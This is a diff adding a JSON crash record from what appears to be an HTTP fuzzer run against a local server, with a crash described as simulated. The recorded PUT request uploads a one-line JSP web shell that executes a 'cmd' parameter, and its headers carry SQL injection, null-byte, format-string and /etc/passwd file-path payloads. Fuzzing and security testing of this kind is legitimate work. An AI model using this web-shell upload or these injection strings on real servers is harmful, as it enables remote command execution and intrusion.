@@ -1,0 +1,24 @@
+{
+  "timestamp": "2025-12-29T14:40:17.149415",
+  "crash_type": "server_crash",
+  "payload": "PUT /cmd.jsp?\nHeaders: {'User-Agent': \"' OR '1'='1\", 'Accept-Encoding': 'A\\x00B', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Referer': 'file:///etc/passwd', 'Accept-Language': '%s%s%s%s%s%s%s%s%s%s', 'Content-Range': 'bytes 0-100/101', 'Content-Length': '59'}\nBody: <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "payload_hash": "5007b2d352f5a908",
+  "request_method": "PUT",
+  "request_path": "/cmd.jsp?",
+  "request_headers": {
+    "User-Agent": "' OR '1'='1",
+    "Accept-Encoding": "A\u0000B",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Referer": "file:///etc/passwd",
+    "Accept-Language": "%s%s%s%s%s%s%s%s%s%s",
+    "Content-Range": "bytes 0-100/101",
+    "Content-Length": "59"
+  },
+  "request_body": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 563
+}
